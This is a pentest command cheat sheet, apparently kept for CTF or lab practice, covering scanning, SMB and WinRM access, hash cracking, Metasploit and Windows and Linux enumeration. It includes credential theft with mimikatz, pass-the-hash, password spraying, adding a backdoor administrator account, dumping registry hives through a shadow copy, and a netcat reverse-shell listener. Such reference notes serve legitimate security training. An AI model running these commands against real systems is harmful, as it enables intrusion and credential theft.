# General

## Setting up a Kali VirtualBox
1. `vi ~/.bashrc` and edit `alias ll='ls -l'` to `alias ll='ls -lah'`
2. Get python3 as default python
   1. update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1
   2. update-alternatives --install /usr/bin/python python /usr/bin/python3 2
   3. update-alternatives --config python
3. `apt install python3-pip`
4. `python -m pip install mssql-cli` (https://github.com/dbcli/mssql-cli)


## Scanning
### General Port
`nmap -v -Pn -sV -p 1-65000 192.168.2.202`
- `-p 1-1023,[1024-]` Scans all ports 1-1023, and anything above 1024 that's registered with nmap (has a name)
- `-v` verbose
- `-Pn` skip the ping test, all machines treated as alive
- `-sU` UDP ports
- `-sV` probe open ports to determine service/version info
- `--open` only show open ports
- `-O detect OS`

### Vuln Scanning
- `nmap --script vuln,safe,discovery -p 443,80 IP_ADDRESS`
- `nmap — script smb-vuln*`

### Web Scanning
- `nikto -host 192.168.2.200`
- `nmap --script=http-enum 192.168.2.200`

### SQL
https://hackertarget.com/sqlmap-tutorial/

## Connecting
https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf

| **Command** | **Example** | **Description** |
| ------------|-------------|-----------------|
|`smbclient -L IPADDRESS -U USER`| `smbclient -L 192.168.1.1 -U AARINC\bob` | connects via IP to DOMAIN\user
|`smbclient -U USERNAME //IPADDRESS/share` | `smbclient -U anonymous //10.10.10.27/backups` | login to SMB share and navigate around
| `nc -nlvp PORT_NUMBER` | | reverse shell receive on this port

### Banner Grabbing
`echo "" | nc -v -n -w1 192.168.2.202 50010`

### RPC Password Spraying
Delimited by % for username and password. \\ means domain/user
`rpcclient -U "AARINC\\Helpdesk%K33pIT\$ecure" "192.168.2.206"`

###Password cracking
https://www.unix-ninja.com/p/A_cheat-sheet_for_password_crackers
https://cyberrunner.medium.com/how-to-crack-passwords-with-hashcat-a9fb2aa1a813

- m 1000 means NTLM
- a 0 means dictionary attack, 3 would be brute force
```
hashcat.exe --help
hashcat -m 1000 -a 0 8eb4f4b78ad0629f1017f69d8d1f2a16 rockyou.txt
```

---

## Metasploit
msfconsole
search ms17-010
use 0
show options
set RHOSTS 192.168.2.206

---
# Windows
Window Privileges: https://www.exploit-db.com/papers/42556

## Enumeration
- Grabbing Windows OS version: `Get-WmiObject -Class win32_OperatingSystem | select Version, BuildNumber`
- Grabbing Powershell version: `$PSVersionTable`
- List out all folders and sub folders pretty-like: `tree FOLDERNAME`
- Open all the files one screen at a time: `tree c:\ /f | more`
- See all running services: `Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl`

### Folder permissions
`icacls c:\windows`
- (CI): container inherit
- (OI): object inherit
- (IO): inherit only
- (NP): do not propagate inherit
- (I): permission inherited from parent container
- F: full access
- D: delete access
- N: no access
- M: modify access
- RX: read and execute access
- R: read-only access
- W : write-only access

| **Command** | **Description** |
| --------------|-------------------|
`icacls c:\users /grant joe:f`| Grant Folder Permissions
`icacls c:\users /remove joe` | Revoke Folder Permissions
`.\PowerView.ps1;Get-LocalGroup` | Run Command from PowerShell program
`get-alias` | Get Alias (ls command -> Get-Child on windows)

### Windows user privileges/groups
``` 
wmic useraccount get domain,name,sid
wmic group get domain,name,sid

whoami /user
whoami /priv
whoami /all
```

### mimikatz
Can crack NTLM hashes with: https://crackstation.net/
```
privilege::debug
log nameoflog.log
sekurlsa::logonpasswords

or if you can't enter the interactive prompt (all on one line)
mimikatz log privilege::debug sekurlsa::logonpasswords exit
```

## Windows Management Instrumentation (WMI)
- `wmic useraccount get domain,name,sid` (if not working, type wmic first, then the rest)
- `Get-WmiObject -Class Win32_OperatingSystem | select SystemDirectory,BuildNumber,SerialNumber,Version | ft` -- getting good information/serial number/os
- `Invoke-WmiMethod -Path "CIM_DataFile.Name='C:\users\public\spns.csv'" -Name Rename -ArgumentList "C:\Users\Public\kerberoasted_users.csv"` -- renaming a file, which will return a success code of '0'

### Testing for remote WinRM connection (port 5985)
``` 
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"

then finally..

Test-WSMan -computername NAME_HERE

then connecting

Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
or
./evil-winrm.rb -u bob -p Frankie -i 192.168.2.212
```

### WinRM
- https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-winrm
- https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/

`crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt`

### Pass the Hash WinRM
-https://ethicalhackingguru.com/how-to-install-and-use-evil-winrm-in-kali-linux/

`./evil-winrm.rb -u ITAdmin -H ca25ecb2135d9acee046f274dc7e1140 -i 192.168.2.210`

### Creating local windows user (powershell)
https://www.lifewire.com/net-command-2618094
```
NET USER username "password" /ADD

then add to a group for RDP...

net localgroup "Remote Desktop Users" mike /add
net localgroup "administrators" "mike" /add
net localgroup "remote management users" mike /add

or to create a new group
net localgroup GROUPNAME /add
```

### Copying files, recursively
`xcopy SOURCE DESTINATION /E /H`

### Get powershell version
`$PSVersionTable`
### NET commands
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771131(v=ws.11)

| **Command** | **Description** |
| --------------|-------------------|
`net share` | See all shares
`net start` | Windows check all services running: 
`net group "Schema Admins" /domain` | /domain is NOT the domain, just leave the actual word there. This command doesn't need altering
`net group "Domain Admins" /domain` | other
`net group "Enterprise Admins" /domain` | other

### Windows file manipulation
- Read files: `type filename.txt` or `more filename.txt`
- Copy folder: `Xcopy /E /I C:\dir1\sourcedir D:\data\destinationdir`

## Windows Firewall
### Windows Firewall rules
```netsh advfirewall firewall show rule name=all```
```Get-NetFirewallRule -Direction Inbound -Enabled True```

### Retrieving files (mimikatz)
```
[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
Invoke-WebRequest -Uri https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip -OutFile mimikatz_trunk.zip
```

### Sid2User
executed from powershell of a computer on the domain
``` 
.\user2sid \\192.168.2.206 "setupadmin"
.\sid2user \\131.107.2.200 5 21 201642981 56263093 24269216 1000
```

## Windows searching
### Grep-ish
https://ss64.com/nt/findstr.html
```
findstr -I -S -P -M "congrat" *.* > results.txt
findstr -I -S -P -M "flag" *.* > results.txt
findstr -I -S -P -M "fl4g" *.* > results.txt
findstr -I -S -P -M "flg" *.* > results.txt
findstr -I -S -P -M "fl)g" *.* > results.txt

or use as a regular expression
findstr -I -S -M -N -R -C:"[0-9]{4,7}\-[0-9]{15,20}" *.*

```
### Modified beyond
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753551(v=ws.11)
```
forfiles /p c:\ /s /m *.* /d +08/01/2016 /c "cmd /c echo @path" > results.txt
forfiles /p c:\ /s /m *.conf /d +08/01/2016 /c "cmd /c echo @path" > results.txt
```

### Modified Between
`datemodified:08/05/2016 .. 08/08/2016`

### Create shadow
Allows to view/edit/modify files previously not allowed
```
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config C:\Extract
vssadmin delete shadow ????????
```

---
# Linux
### Linux system searching
https://man7.org/linux/man-pages/man1/grep.1.html
```
grep --color -InH --exclude=*.{js,template,css,rb,py,json,pm,c,symvers,h,po,map,x} --exclude-dir={bin,boot,dev,mnt,proc,sys,jvm,ruby,python,build,libs,include,lib} -irE '(password|pwd|pass)[[:space:]]*=[[:space:]]*[[:alpha:]]+' *

grep --color -InH --exclude=*.{js,template,css,rb,py,json,pm,c,symvers,h,po,map,x} --exclude-dir={bin,boot,dev,mnt,proc,sys,/usr/lib,jvm,ruby,python,build,libs,/usr/include,lib} -irE '[0-9]{4,7}\-[0-9]{15,20}' *

and for general searching
grep -inHsr "169.254.22.212" *
grep --exclude-dir={boot,dev,proc,sys,lib} -inHsr "169.254.22.212" *
```
### Linux search between dates
```
find -newerct "17 Aug 2016" ! -newerct "19 Aug 2016" -ls
```
### LDAP
```
ldapsearch -x -h 192.168.2.206 -s base namingcontexts
```

### Remove non-ascii characters from dictionary file
``` 
perl -pi -e 's/[^[:ascii:]]//g' dictionary.txt
```

### RDP from Linux
``` xfreerdp /v:<targetIp> /u:htb-student /p:Password ```

### Running net commands from linux on a windows machine:
```net rpc group members 'Schema Admins' -I <DC-IP> -U "<USER>"%"<PASS>"
net rpc group members 'Domain Admins' -I <DC-IP> -U "<USER>"%"<PASS>"
net rpc group members 'Enterprise Admins' -I <DC-IP> -U "<USER>"%"<PASS>"

# Example:
net rpc group members 'Domain Admins' -I 10.10.30.52 -U "john"%"pass123"```